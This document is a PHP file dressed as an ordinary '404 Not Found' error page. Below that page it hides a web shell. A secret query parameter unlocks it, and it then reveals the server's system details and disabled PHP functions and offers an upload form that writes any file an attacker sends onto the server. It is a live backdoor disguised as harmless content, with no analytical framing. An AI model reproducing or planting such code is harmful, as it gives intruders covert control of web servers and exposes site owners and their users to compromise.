<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
</body></html>
<?php
if(isset($_GET["b4t0s4y"]))
 {
  echo"<font color=#ffffff>".php_uname()."";
  print "\n";$disable_functions = @ini_get("disable_functions"); 
  echo "<br>DisablePHP=".$disable_functions; print "\n"; 
  echo"<br><form method=post enctype=multipart/form-data>"; 
  echo"<input type=file name=f><input name=k type=submit id=k value=upload><br>"; 
    if($_POST["k"]==upload)
{ if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){
echo"<b>".$_FILES["f"]["name"];
}else{
echo"<b>Gagal Bro";
}
} 
}